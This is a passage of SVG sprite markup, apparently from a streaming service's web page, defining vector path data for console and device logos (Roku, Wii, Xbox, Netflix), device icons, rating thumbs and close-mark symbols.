                            <path d="M78.8873789,11.8294244 C78.7826245,11.8205456 77.3357505,11.6941867 77.1369214,11.6735319 C76.1761153,11.5738094 75.7746495,10.5653684 75.7746495,9.92460182 L75.7746495,9.43468082 C75.7746495,8.80363416 75.9780291,7.50658653 77.5504599,7.50658653 C78.5410764,7.50658653 80.8246857,7.50658653 80.8246857,7.50658653 L80.8238499,6.00149539 C80.8238499,6.00149539 78.6156489,6.00149539 77.0781363,6.00149539 C74.3494136,6.00149539 73.4453495,8.26072095 73.4453495,9.45692448 L73.4453495,10.2833975 C73.4453495,11.2663237 74.1195668,13.3985361 76.4252785,13.6637776 C76.6838214,13.6934981 77.280773,13.7365835 77.5786916,13.7607898 C78.6875283,13.8508859 79.1681171,14.6918453 79.1681171,15.5885073 C79.1681171,15.8432812 79.1636595,16.1832912 79.1636595,16.3231084 C79.1636595,18.0057749 78.0812899,18.3713932 77.4659506,18.3713932 C76.8636126,18.3713932 73.9710718,18.3713932 73.9710718,18.3713932 L73.9710718,19.8561099 C73.9710718,19.8561099 77.3601746,19.8561099 78.3936959,19.8561099 C80.3971242,19.8561099 81.5995713,18.1867148 81.5995713,16.1872165 L81.5995713,15.3230789 C81.5995713,13.6714414 80.5512841,11.9712977 78.8873789,11.8294244 Z M85.8129651,7.53883047 L83.3679522,7.53761547 C83.3679522,7.53761547 83.3679522,15.6280412 83.3679522,16.9373321 C83.3679522,18.0906372 84.2044089,19.8566706 86.1608463,19.8566706 C87.4888501,19.8566706 87.7856543,19.8566706 87.7856543,19.8566706 L87.7856543,18.3732624 C87.7856543,18.3732624 87.6309372,18.3732624 86.6944624,18.3732624 C86.2316113,18.3732624 85.8135223,18.0491406 85.8135223,17.2666876 C85.8135223,16.6646138 85.8135223,10.809955 85.8135223,10.809955 L88.433683,10.809955 L88.433683,9.30589193 L85.8129651,9.30589193 L85.8129651,7.53883047 Z M52.8461536,14.3325824 C52.8461536,15.364482 52.8471751,14.8659626 52.8471751,16.6530247 C52.8471751,18.909166 54.347355,19.8577922 55.4409615,19.8577922 C56.9121668,19.8577922 57.8837455,19.8577922 57.8837455,19.8577922 L57.8837455,18.3710193 C57.8837455,18.3710193 57.0000194,18.3710193 56.3187441,18.3710193 C55.8704732,18.3710193 55.2888447,18.3141952 55.2888447,16.9881748 L55.2888447,14.0581818 C55.2888447,10.9901473 56.3152152,10.8098616 57.0156211,10.8098616 C58.6837981,10.8098616 58.9717799,10.8098616 58.9717799,10.8098616 L58.9717799,19.8656429 L61.3951546,19.8594745 L61.3951546,9.30654618 C61.3951546,9.30654618 59.2902222,9.30654618 57.2422175,9.30654618 C55.6670007,9.30654618 52.8461536,9.6014147 52.8461536,14.3325824 Z M48.6436252,6.0009346 L48.6436252,19.8564837 L51.0630066,19.8564837 L51.0626352,6.0009346 L48.6436252,6.0009346 Z M89.411391,14.3325824 C89.411391,15.364482 89.4125054,14.8659626 89.4125054,16.6530247 C89.4125054,18.909166 90.9126853,19.8577922 92.0062918,19.8577922 C93.4774971,19.8577922 94.4490758,19.8577922 94.4490758,19.8577922 L94.4490758,18.3710193 C94.4490758,18.3710193 93.5653496,18.3710193 92.8840744,18.3710193 C92.4357106,18.3710193 91.854175,18.3141952 91.854175,16.9881748 L91.854175,14.0581818 C91.854175,10.9901473 92.8805454,10.8098616 93.5809514,10.8098616 C95.2490355,10.8098616 95.5371102,10.8098616 95.5371102,10.8098616 L95.5371102,19.8656429 L97.9605778,19.8594745 L97.9605778,9.30654618 C97.9605778,9.30654618 95.8556454,9.30654618 93.8075478,9.30654618 C92.232331,9.30654618 89.411391,9.6014147 89.411391,14.3325824 Z M67.6085407,16.2416107 L65.2675394,9.30645271 L62.7133145,9.30645271 L66.2553699,19.774986 L64.2624355,25 L66.3716399,25 L72.5864189,9.30757425 L70.2791284,9.30757425 L67.6085407,16.2416107 Z M43.9662659,6.00009346 C41.8251152,6.00009346 38,6.00289728 38,6.00289728 L38,19.8561099 L40.4257893,19.8562968 L40.4257893,7.50873611 C40.4257893,7.50873611 42.2865733,7.50873611 43.2855479,7.50873611 C44.1206115,7.50873611 44.7114339,8.52829892 44.7114339,10.3152675 C44.7114339,12.0470009 44.1855258,13.1823615 43.2606594,13.1823615 C42.283973,13.1823615 41.4942287,13.1823615 41.4942287,13.1823615 L41.4942287,14.666424 C41.4942287,14.666424 42.7930721,14.6659567 44.0044344,14.6659567 C45.0408346,14.6659567 47.1364802,13.7067695 47.1364802,10.372372 C47.1364802,6.86469841 45.1403884,6.00009346 43.9662659,6.00009346 Z M125.37169,9.30682657 C123.305948,9.30682657 121.053728,9.30682657 121.053728,9.30682657 L121.053728,19.8568576 L123.513042,19.8572314 L123.513042,10.8079924 C123.513042,10.8079924 123.952305,10.8079924 125.504491,10.8079924 C127.021201,10.8079924 127.16626,12.5436511 127.16626,14.1269688 C127.16626,15.6393499 127.16626,19.8562968 127.16626,19.8562968 L129.598085,19.8562968 C129.598085,19.8562968 129.598085,15.3384065 129.598085,14.0930426 C129.598085,11.2155745 128.406411,9.30682657 125.37169,9.30682657 Z M115.016047,9.30757425 C110.773493,9.30757425 110.558226,12.7284229 110.558226,13.9512627 L110.558226,15.3126113 C110.558226,17.096963 111.191767,19.8583529 115.07511,19.8583529 C118.607229,19.8583529 119.476654,17.3543538 119.476654,15.2292443 L119.476654,13.9584592 C119.476654,13.3379736 119.474796,9.30757425 115.016047,9.30757425 Z M117.022168,15.0505475 C117.022168,17.120889 116.6611,18.3768139 115.033692,18.3768139 C113.655725,18.3768139 112.996181,17.6276329 112.996181,15.0275562 L112.996181,14.1299596 C112.996181,12.3622438 113.221849,10.8037866 115.019204,10.8037866 C116.786099,10.8037866 117.022168,12.292896 117.022168,14.1351934 L117.022168,15.0505475 Z M102.400568,7.53883047 L99.9555552,7.53761547 C99.9555552,7.53761547 99.9555552,15.6280412 99.9555552,16.9373321 C99.9555552,18.0906372 100.791919,19.8566706 102.748449,19.8566706 C104.076453,19.8566706 104.373257,19.8566706 104.373257,19.8566706 L104.373257,18.3732624 C104.373257,18.3732624 104.21854,18.3732624 103.282065,18.3732624 C102.819214,18.3732624 102.401125,18.0491406 102.401125,17.2666876 C102.401125,16.6646138 102.401125,10.809955 102.401125,10.809955 L105.021286,10.809955 L105.021286,9.30589193 L102.400568,9.30589193 L102.400568,7.53883047 Z M132.629277,17.0913554 C131.872036,17.0913554 131.258369,17.7089437 131.258369,18.4708353 C131.258369,19.232727 131.872036,19.8505022 132.629277,19.8505022 C133.386332,19.8505022 134,19.232727 134,18.4708353 C134,17.7089437 133.386332,17.0913554 132.629277,17.0913554 Z M132.629091,19.6609639 C131.976048,19.6609639 131.446704,19.128051 131.446704,18.4708354 C131.446704,17.8136197 131.976048,17.2807068 132.629091,17.2807068 C133.282321,17.2807068 133.811851,17.8136197 133.811851,18.4708354 C133.811851,19.128051 133.282321,19.6609639 132.629091,19.6609639 Z M106.511808,19.8577922 L108.937876,19.8577922 L108.937876,9.30654618 L106.511808,9.30654618 L106.511808,19.8577922 Z M106.511808,8.07230416 L108.937876,8.07230416 L108.937876,6 L106.511808,6 L106.511808,8.07230416 Z M133.247774,19.0871152 C133.240345,19.059077 133.235701,19.0166458 133.233658,18.9594479 L133.2266,18.7585074 C133.223257,18.671402 133.206727,18.6085964 133.177381,18.5697168 C133.148034,18.5310241 133.104201,18.4996213 133.046066,18.4758822 C133.112373,18.4413018 133.163822,18.3953191 133.200597,18.3381211 C133.237559,18.2809232 133.255946,18.20765 133.255946,18.1177408 C133.255946,17.9457731 133.187225,17.8276388 133.049967,17.7637117 C132.97753,17.7304397 132.885591,17.7138036 132.77415,17.7138036 L132.097147,17.7138036 L132.097147,19.2125395 L132.298855,19.2125395 L132.298855,18.5697168 L132.745176,18.5697168 C132.825227,18.5697168 132.88392,18.5788759 132.921438,18.5973811 C132.987188,18.6306531 133.022106,18.6962625 133.02675,18.7942094 L133.039008,19.0441233 C133.041794,19.1028166 133.045137,19.1420701 133.049224,19.1626314 C133.05331,19.1830059 133.058696,19.1996419 133.065382,19.2125395 L133.312781,19.2125395 L133.312781,19.1788936 C133.281578,19.1652484 133.260033,19.1345933 133.247774,19.0871152 Z M132.970844,18.343355 C132.917166,18.3814869 132.844358,18.400366 132.752419,18.400366 L132.298855,18.400366 L132.298855,17.8882013 L132.778051,17.8882013 C132.845101,17.8882013 132.898593,17.898482 132.938711,17.9188564 C133.013748,17.9575492 133.051081,18.0304485 133.051081,18.1371806 C133.051081,18.2364359 133.024335,18.305223 132.970844,18.343355 Z"></path>
                        </symbol>
                        <symbol viewBox="0 0 112 40" id="logo-roku">
                            <path d="M108.767 12.767h.2c.232 0 .432-.067.432-.267 0-.167-.133-.3-.4-.3-.1 0-.2.033-.232.033v.534zm0 1.067h-.434v-1.867c.167-.033.4-.067.7-.067.366 0 .5.067.667.134.1.1.166.233.166.4 0 .233-.166.366-.4.433v.033c.2.067.3.2.367.467.033.267.066.4.133.467h-.467c-.066-.067-.1-.234-.166-.467-.034-.2-.134-.3-.366-.3h-.2v.767zm-1.167-1c0 .833.633 1.5 1.467 1.5.8 0 1.4-.667 1.4-1.467 0-.833-.6-1.5-1.433-1.5-.801 0-1.434.667-1.434 1.467zm3.366 0c0 1.067-.833 1.9-1.932 1.9-1.067 0-1.901-.833-1.901-1.9 0-1.034.834-1.867 1.9-1.867 1.1 0 1.933.833 1.933 1.867zm-39.733-1.867l-9.8 9.833v-9.865H52.9V36h8.533V25.833L71.667 36h10.732L69.366 22.934l10.8-10.767v14.867c0 4.933 2.967 9.466 10.467 9.466 3.534 0 6.8-2 8.367-3.833L102.833 36h1.833V10.967h-8.533v16.2c-.966 1.667-2.3 2.733-4.367 2.733-2.1 0-3.066-1.233-3.066-5.233v-13.7H71.233zM38.1 16.634c-2.267 0-4.167 3.067-4.167 6.833 0 3.8 1.9 6.866 4.167 6.866 2.3 0 4.2-3.066 4.2-6.866 0-3.766-1.9-6.833-4.2-6.833zm13.133 6.833c0 7.233-5.9 13.033-13.133 13.033-7.234 0-13.1-5.8-13.1-13.033 0-7.234 5.866-13.033 13.1-13.033 7.233 0 13.133 5.8 13.133 13.033zM16.466 14.7c0-2.968-2.366-5.367-5.3-5.367H8.534v10.7h2.634c2.933 0 5.3-2.4 5.3-5.333zm12 21.332H18.8l-7.7-10.7H8.533V36H0V4h12.2C19.267 4 25 8.801 25 14.7c0 3.6-2.2 6.8-5.533 8.767l9 12.566z" />
                        </symbol>
                        <symbol viewBox="0 0 80 40" id="logo-wii">
                            <path d="M76.798 36.133h.4V33.5l.967 2.633h.367l.967-2.633h.033v2.633h.366V33h-.566l-.967 2.633-1-2.633h-.567v3.133zm-1.832 0h.433v-2.8h1.032V33h-2.5v.333h1.035v2.8zm-10.401 0h6.766V14h-6.766v22.133zM67.931 2c-2.2 0-4 1.8-4 4.034 0 2.2 1.8 4 4 4 2.234 0 4.034-1.8 4.034-4 0-2.233-1.8-4.034-4.034-4.034zM50.232 36.133H57V14h-6.767v22.133zM53.632 2a4.027 4.027 0 0 0-4.034 4.034c0 2.2 1.801 4 4.035 4 2.2 0 3.999-1.8 3.999-4 0-2.233-1.8-4.034-4-4.034zM46.4 4.134l-7.6 26.8s-1.034 5.566-5.4 5.566c-4.367 0-5.4-5.567-5.4-5.567l-4.8-17.466-4.833 17.466S17.333 36.5 13 36.5c-4.367 0-5.4-5.567-5.4-5.567L0 4.133h7.166L13.4 27.968S17.232 13.5 18.366 8.633c1.166-4.866 4.834-4.8 4.834-4.8s3.666-.066 4.799 4.8c1.166 4.867 5 19.334 5 19.334l6.233-23.833h7.167z" />
                        </symbol>
                        <symbol viewBox="0 0 104 40" id="logo-xbox">
                            <path d="M103.332 29.134l-6.7-9.367 6.333-8.867.267-.366H100.7l-.067.1-5.133 7.466-4.967-7.466-.1-.1H87.833l.233.366 6.1 8.834-6.467 9.432-.266.334h2.566l.066-.1 5.434-7.867 5.334 7.867.066.1h2.666l-.233-.366zM83.766 14.5c1.066 1.566 1.6 3.433 1.6 5.5 0 2.066-.534 3.9-1.6 5.466-1.067 1.6-2.767 2.434-5.033 2.467-2.3-.033-4-.867-5.067-2.467-1.067-1.566-1.634-3.4-1.6-5.467-.034-2.066.533-3.933 1.6-5.5 1.067-1.6 2.766-2.4 5.067-2.467 2.266.067 3.966.867 5.033 2.468zm1.6 12.333c1.467-1.867 2.2-4.2 2.2-6.834 0-2.666-.733-5-2.2-6.933-1.466-1.934-3.7-2.933-6.633-3-2.934.067-5.167 1.066-6.634 3-1.5 1.934-2.233 4.233-2.233 6.933 0 2.667.734 4.967 2.2 6.834 1.5 2 3.733 3.032 6.667 3.066 2.933-.034 5.167-1.066 6.632-3.066zm-29.333-6.2l1.633-.034H61.8c3.034.033 4.533 1.134 4.566 3.367 0 1.366-.432 2.3-1.3 2.833-.8.5-1.832.767-3.033.767h-5.999v-6.934zm0-8.134h5.766c2.6 0 3.867 1.067 3.867 3.233 0 .834-.3 1.501-.933 2.034-.634.567-1.634.867-2.934.9h-5.766V12.5zm9.4 16.4c.9-.4 1.6-.9 2.066-1.466.433-.567.767-1.2.9-1.834.133-.6.167-1.1.167-1.6-.034-2.4-1.167-3.933-3.333-4.566.7-.3 1.266-.767 1.732-1.367.601-.8.901-1.734.901-2.766-.034-1.801-.667-3.068-1.866-3.768-1.134-.667-2.5-1-4.1-1h-8.068v8.134h-2.5l-1.366 1.966h3.866V29.5H61.8c1.5 0 2.734-.2 3.634-.6zm-12.634.234l-6.7-9.367 6.334-8.867.266-.366h-2.5l-.066.1-5.167 7.466L40 10.634l-.067-.1H37.333l.233.366 6.1 8.834-6.5 9.432-.233.334h2.533l.067-.1 5.433-7.867 5.367 7.867.066.1H53.066l-.267-.366zM7.3 6.534c.033 0 .067-.034.067-.034 2.5-1.633 5.4-2.5 8.6-2.5 3 0 5.833.834 8.234 2.267.167.1.633.433.9.733h-.034c-.3-.333-.7-.533-1.133-.633-.934-.067-2.067.133-3.268.6C18.266 8.034 15.9 9.901 15.9 9.901v.066c-.3-.266-.6-.5-.934-.766-1.967-1.434-3.8-2.4-5.2-2.8-.467-.134-.9-.167-1.3-.134h-.333c-.067.033-.134.033-.2.066-.067 0-.1 0-.134.034-.067 0-.1 0-.133.033-.133.033-.267.1-.367.133zM31.966 20c0 8.834-7.166 16-16 16S0 28.834 0 20c0-4.234 1.633-8.1 4.3-10.933 0 0 .7-.833 1.766-.9 3.267.266 6.9 4.266 6.9 4.266-1.8 1.734-6.166 7.035-7.6 10.567-2.2 5.4-1.2 7.767-1.2 7.767.267-2.966 4.767-8.234 6.334-9.934.9-.932 2.5-2.532 3.7-3.8l1.7-1.7c.5.467.966.933 1.4 1.367 2.033 2 3.566 3.666 4.566 4.833 1.033 1.134 2.9 3.367 3.4 4.067 2.166 3.034 2.5 5.134 2.5 5.134.833-4.1-.533-7.067-2.866-10.833-1.8-2.9-4.467-5.801-5.6-6.934-.167-.133-.334-.3-.5-.434v-.066c3.266-3.066 5.9-4.1 6.632-4.333.667-.067 1.434.066 2.067.766.067.067.134.134.2.234C30.367 11.967 31.967 15.8 31.967 20z" />
                        </symbol>
                        <symbol viewBox="0 0 49 34" id="mobile-device">
                            <path d="M39.167 32.133a.727.727 0 0 1-.7-.7c0-.4.333-.733.7-.733.4 0 .732.332.732.733 0 .367-.332.7-.732.7zM40.1 18.6c-.333-.2-.9-.534-1.266-.7l-.801-.5c-.333-.234-.633-.034-.633.333V21.1c0 .4.3.566.633.367l.8-.467c.367-.2.934-.533 1.267-.733l.833-.467c.334-.2.334-.534 0-.734L40.1 18.6zm6.267 10.8c0 .234-.2.4-.4.4h-13.6c-.2 0-.367-.166-.367-.4V8.566c0-.233.167-.4.367-.4h13.6c.2 0 .4.167.4.4V29.4zm-9.9-22.667h-4.334c-.833 0-1.532.667-1.532 1.5v23.234c0 .833.7 1.533 1.532 1.533h14.1c.834 0 1.534-.7 1.534-1.534V8.233c0-.833-.7-1.5-1.534-1.5h-9.767zM20.733 14.2c-.334-.167-.9-.5-1.267-.7l-.8-.467c-.334-.233-.634-.034-.634.333v3.368c0 .4.3.532.634.365l.8-.5c.367-.166.933-.5 1.267-.733l.833-.433c.332-.233.332-.567 0-.733l-.833-.5zM2.8 28.967c-1 0-1.8-.8-1.8-1.8V2.832C1 1.833 1.8 1 2.8 1h31.867c1 0 1.8.833 1.8 1.833v3.9h-2.734v-3h-30v22.5h26.868v2.734H2.8z" />
                        </symbol>
                        <symbol viewBox="0 0 111 30" id="netflix-logo">
                            <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z" />
                        </symbol>
                        <symbol viewBox="0 0 57 34" id="pc-device">
                            <path d="M26.933 17.266v-3.5c0-.567.4-.8.9-.533l1.2.7L30.867 15l1.167.667c.5.3.5.766 0 1.067l-1.167.7c-.5.265-1.332.732-1.832 1.032l-1.2.7c-.5.3-.9.034-.9-.533v-1.367zm4.3 13.9h-5.366c-.3 0-.567.234-.567.567 0 .3.267.533.567.533h5.366c.3 0 .567-.233.567-.533a.562.562 0 0 0-.567-.567zM9.5 28.933h38.1V3.466H9.5v25.467zM54.8 33H2.334C1.6 33 1 32.4 1 31.666c0-.7.6-1.3 1.334-1.3h4.7V3.235C7.034 2 8.034 1 9.267 1h38.566c1.233 0 2.233 1 2.233 2.234v27.133H54.8c.733 0 1.3.6 1.3 1.3 0 .733-.567 1.333-1.3 1.333z" />
                        </symbol>
                        <symbol viewBox="0 0 63 48" id="icon-price-tag">
                            <g>
                                <path d="M35.752 7.65c-1.1 0-2.1.45-2.85 1.2a3.97 3.97 0 0 0 .1 5.651c.75.7 1.7 1.1 2.75 1.1a4.01 4.01 0 0 0 2.851-1.2c.75-.8 1.149-1.8 1.1-2.85 0-1.05-.451-2.05-1.201-2.8a4.072 4.072 0 0 0-2.75-1.1m-.002 9.15c-1.35 0-2.65-.5-3.6-1.45-2.05-1.95-2.101-5.25-.15-7.3 1-1.05 2.3-1.6 3.75-1.6 1.35 0 2.6.5 3.6 1.45.95.95 1.55 2.25 1.55 3.65.05 1.35-.5 2.65-1.45 3.65-.95 1.05-2.3 1.6-3.7 1.6m-2.148 9.701a.727.727 0 0 1-1.05 0l-5.3-5.05c-.3-.3-.3-.75 0-1.05.25-.3.75-.3 1.05-.05l5.25 5.1c.3.3.3.75.05 1.05m-5.95-10.05l-4.55.098v-1.799c0-.4-.35-.7-.75-.7-.401 0-.701.3-.701.7l.05 2.55c0 .3.2.55.45.65.101.05.15.05.25.05l5.301-.1c.4 0 .7-.3.7-.7 0-.4-.35-.75-.75-.75m.1 16.15a.723.723 0 0 1-1.05 0l-5.301-5.099c-.3-.25-.3-.75 0-1.05.25-.25.75-.3 1 0l5.301 5.1c.3.25.3.75.05 1.05m-5.951-10.05l-4.55.1v-1.8c-.05-.4-.35-.75-.75-.75-.4.05-.75.35-.7.75v2.55c.05.3.2.55.5.65.05.05.15.05.25.05l5.25-.1c.4 0 .75-.35.75-.75s-.35-.7-.75-.7m.25 15.95c-.299.3-.75.3-1.049 0l-5.301-5.1c-.3-.25-.3-.75 0-1.05.3-.25.75-.3 1.05 0l5.251 5.1c.299.25.35.75.049 1.05m-5.95-10.05l-4.5.1-.05-1.8c0-.4-.35-.75-.75-.75-.401.05-.7.35-.7.75l.049 2.55c0 .3.201.55.451.65.1.05.2.05.3.05l5.25-.1c.4 0 .7-.35.7-.75s-.35-.7-.75-.7M43.903 4.9c0-.5-.122-.876-.35-1.1-.279-.274-.65-.3-.85-.3H42.402c-.799.05-1.85.05-3.049.05-5.551 0-13.151-.35-13.851-.35-.15 0-.3.05-.45.2L1.4 27.952c-.1.15-.2.3-.2.5s.1.35.25.5l18.301 17.65c.25.25.751.25 1.001-.05l23.651-24.55c.153-.197.198-.488.2-.7M20.252 48.002a1.937 1.937 0 0 1-1.351-.55L.6 29.801c-.35-.349-.6-.799-.6-1.299 0-.55.2-1 .55-1.4L24.202 2.548c.3-.299.699-.5 1.15-.549h.15c.1 0 8.1.35 13.851.35 1.149 0 2.149 0 3-.05h.35c.7 0 1.3.2 1.75.65.45.45.65 1.1.65 1.95.05.85.705 14.126.65 16.551-.011.502-.15 1-.5 1.4L21.602 47.403c-.35.35-.85.6-1.35.6" />
                                <path d="M62.004 0c-2.95 6.4-12.651 6.4-12.651 6.4-7.05.1-10.951 2.25-12.751 3.601-.7-.351-1.55-.2-2.1.35-.7.7-.65 1.85.05 2.549.7.651 1.85.651 2.5-.049.55-.55.65-1.3.4-1.951 5.05-3.5 11.9-3.299 11.9-3.299C60.105 7.601 62.855.6 62.855.6l-.85-.6z" />
                            </g>
                        </symbol>
                        <symbol viewBox="0 0 91 48" id="icon-cross-device-screens-small">
                            <path d="M70.979 45.508V48h-1.396v-2.542H49.895v-1.395h19.688c.798 0 1.396.647 1.396 1.445zM90.717 1.396V41.62c0 .748-.648 1.396-1.495 1.396H49.895V41.62h39.327V1.396H20.088v13.109h-1.397V1.395C18.691.599 19.29 0 20.088 0h69.134c.847 0 1.495.598 1.495 1.396zm-39.078 45.01v.697c0 .498-.798.897-1.744.897H13.608v-1.595h38.031zM5.035 44.71c0-.398.299-.747.698-.747.398 0 .747.349.747.747 0 .4-.349.697-.747.697a.68.68 0 0 1-.698-.697zm-.947-20.037v-6.728c0-.799.648-1.447 1.445-1.447h41.221c.748 0 1.396.648 1.396 1.447v26.018c0 .797-.648 1.395-1.396 1.395H13.608v-1.395h33.096V17.894H5.534v6.78H4.087zM1.446 46.604h8.772V27.913H1.446v18.691zm10.218-18.691v18.642c0 .797-.598 1.445-1.446 1.445H1.396C.648 48 0 47.352 0 46.555V27.913c0-.797.648-1.397 1.396-1.397h8.822c.848 0 1.446.6 1.446 1.397z" />
                        </symbol>
                        <symbol viewBox="0 0 145 48" id="icon-cross-device-screens-desktop">
                            <path d="M138.211 44.009c-.398 0-.697.349-.697.748 0 .398.3.698.697.698.4 0 .749-.3.749-.698 0-.4-.35-.748-.749-.748zm-4.19 2.593h8.682V28.191h-8.682v18.411zm-.05-19.807h8.732c.798 0 1.396.598 1.396 1.396v18.362c0 .798-.598 1.447-1.396 1.447h-8.732c-.749 0-1.397-.649-1.397-1.447V28.191c0-.798.648-1.396 1.397-1.396zM74.095 44.009h48.7V13.173h-48.7v30.836zm0-32.233h48.75c.748 0 1.396.648 1.396 1.446v30.787c0 .798-.648 1.396-1.397 1.396H74.095c-.797 0-1.396-.598-1.396-1.396V13.222c0-.798.599-1.446 1.396-1.446zm56.583 34.677v.649c0 .499-.799.898-1.747.898H67.66c-.998 0-1.746-.4-1.746-.898v-.649h64.764zm-111.567.898v-2.445c0-.798.648-1.446 1.396-1.446h29.688c.799 0 1.397.648 1.397 1.446v2.445h-1.397v-2.494H20.557v2.494H19.11zM1.397 41.065h68.208V1.397H1.397v39.668zM1.397 0h68.208c.799 0 1.447.599 1.447 1.397v39.668c0 .748-.648 1.396-1.447 1.396H1.397A1.394 1.394 0 0 1 0 41.065V1.397C0 .599.599 0 1.397 0z" />
                        </symbol>
                        <symbol viewBox="0 0 44 44" id="rating-thumbs-up">
                            <path d="M36.2259059,39.0138889 C36.2259059,41.128741 34.2435159,41.8394049 32.6453354,41.9746203 L21.0300552,42 C11.6911102,42 12.1611411,39.0138889 5,38.4166667 L5,24.0833333 L10.073607,21.1623699 L16.2619026,9.95583842 C16.2619026,9.95583842 16.9677739,0.974629541 16.9677739,0.480247712 C16.9677739,0.480247712 22.5402979,-2.23393403 23.9216431,5.2426348 C25.3029884,12.7192036 24.344293,17.3331909 24.0839076,17.9993896 L36.2134373,18.0247694 C37.8116178,18.1599847 39.8064765,18.9823701 39.8064765,21.0972222 C39.8064765,23.2120744 37.8240865,23.9227383 36.2259059,24.0579536 L37.4194295,24.0833333 C39.01761,24.2439284 41,24.9545923 41,27.0694444 C41,29.1842966 39.01761,29.8949605 37.4194295,30.0301758 L35.0323824,30.0555556 C36.6305629,30.2161506 38.612953,30.9268145 38.612953,33.0416667 C38.612953,35.1565188 36.6305629,35.8671827 35.0323824,36.002398 L32.6453354,36.0277778 C34.2435159,36.1883728 36.2259059,36.8990367 36.2259059,39.0138889 Z" />
                        </symbol>
                        <symbol viewBox="0 0 44 44" id="rating-thumbs-down">
                            <path d="M7.77409406,4.98611111 C7.77409406,2.87125897 9.75648409,2.16059507 11.3546646,2.02537973 L22.9699448,2 C32.3088898,2 31.8388589,4.98611111 39,5.58333333 L39,19.9166667 L33.926393,22.8376301 L27.7380974,34.0441616 C27.7380974,34.0441616 27.0322261,43.0253705 27.0322261,43.5197523 C27.0322261,43.5197523 21.4597021,46.233934 20.0783569,38.7573652 C18.6970116,31.2807964 19.655707,26.6668091 19.9160924,26.0006104 L7.78656274,25.9752306 C6.18838222,25.8400153 4.19352352,25.0176299 4.19352352,22.9027778 C4.19352352,20.7879256 6.17591354,20.0772617 7.77409406,19.9420464 L6.58057055,19.9166667 C4.98239002,19.7560716 3,19.0454077 3,16.9305556 C3,14.8157034 4.98239002,14.1050395 6.58057055,13.9698242 L8.96761758,13.9444444 C7.36943706,13.7838494 5.38704703,13.0731855 5.38704703,10.9583333 C5.38704703,8.84348119 7.36943706,8.13281729 8.96761758,7.99760195 L11.3546646,7.97222222 C9.75648409,7.81162716 7.77409406,7.10096325 7.77409406,4.98611111 Z" />
                        </symbol>
                        <symbol viewBox="0 0 34 37" id="thumbs-down">
                            <path d="M30.9 6.933V21.9c-1.5 1-3.2 1.134-5.133.4V7c1.633-.567 3.366-.6 5.132-.067M6.767 4c2.833.067 5.633.534 7.999 1.034 3.5.733 4.267 1.067 7.733 1.932v15.767c-1.4 1.933-3.666 3.767-5.732 5.167-1.1.734-2.167 1.433-3.268 2.2-2.2 1.5-4.466 3.567-5.966 5.9-1-2.333-1.2-4.367-.4-6.367C7.867 27.667 8.5 26.7 10.1 24.6 7.933 23.933 3.167 22.533 1 21.9c.533-4.8 1.667-8.167 5.767-17.9" />
                        </symbol>
                        <symbol viewBox="0 0 34 37" id="thumbs-up">
                            <path d="M26.134 33c-2.834-.067-5.634-.534-7.968-1.034-3.532-.733-4.3-1.067-7.766-1.932v-15.8c1.4-1.9 3.667-3.734 5.8-5.134l3.2-2.2c2.2-1.5 4.467-3.567 5.967-5.9 1 2.333 1.2 4.367.4 6.367C25.033 9.333 24.4 10.3 22.8 12.4c2.167.666 6.967 2.066 9.1 2.699-.533 4.8-1.633 8.167-5.766 17.9M2 30.067V15.1c1.5-1 3.233-1.134 5.134-.4V30c-1.634.567-3.367.6-5.134.067" />
                        </symbol>
                        <symbol viewBox="0 0 49 34" id="tv-device">
                            <path d="M22.6 17.733v-3.7c0-.433.3-.633.7-.4l.9.534c.399.2 1 .567 1.4.8l.9.533c.4.2.4.567 0 .8l-.9.5c-.4.233-1.001.6-1.4.8l-.9.533c-.4.234-.7.067-.7-.4zM3.6 26.5h41.432V3.567H3.6V26.5zM47.632 3.1v23.866c0 1.167-.934 2.1-2.1 2.1H28.565c0 .667.234 1.568 1.334 2.2h3.533a.86.86 0 0 1 .867.867c0 .467-.4.867-.867.867H15.2a.882.882 0 0 1-.867-.867c0-.5.4-.867.867-.867h3.533c1.1-.632 1.333-1.533 1.333-2.2H3.1c-1.167 0-2.1-.933-2.1-2.1V3.101C1 1.934 1.933 1 3.1 1h42.432c1.167 0 2.1.934 2.1 2.1z" />
                        </symbol>
                        <symbol viewBox="0 0 34 34" id="x-circle">
                            <path d="M25.2 9.933L24.066 8.8a1.53 1.53 0 0 0-2.167 0L17 13.666 12.1 8.8c-.6-.6-1.567-.6-2.167 0L8.8 9.933c-.6.6-.6 1.567 0 2.167l4.9 4.9-4.9 4.9c-.6.6-.6 1.567 0 2.167L9.933 25.2c.6.6 1.567.6 2.167 0l4.9-4.9 4.9 4.9c.6.6 1.567.6 2.166 0l1.134-1.133c.6-.6.6-1.568 0-2.168L20.3 17l4.9-4.9c.6-.6.6-1.566 0-2.166M33 17c0 8.834-7.166 16-16 16S1 25.834 1 17 8.166 1 17 1s16 7.166 16 16" />
                        </symbol>
                        <symbol viewBox="0 0 10 10" id="x-mark">
                            <path d="M6.899 5.01l2.823 2.823A.846.846 0 0 1 10 8.45c0 .22-.099.457-.278.636l-.656.656a.91.91 0 0 1-.616.26c-.22 0-.458-.101-.637-.26L4.99 6.92 2.167 9.742a.91.91 0 0 1-.617.26c-.218 0-.456-.101-.636-.26l-.656-.656A.997.997 0 0 1 0 8.45c0-.22.099-.458.258-.617L3.082 5.01.258 2.187A.997.997 0 0 1 0 1.551c0-.22.099-.457.258-.617L.914.278A.933.933 0 0 1 1.55 0c.22 0 .458.1.617.278L4.99 3.102 7.813.278A.932.932 0 0 1 8.45 0c.218 0 .457.1.616.278l.656.656c.179.16.278.398.278.617a.924.924 0 0 1-.278.636L6.899 5.01z" />
                        </symbol>
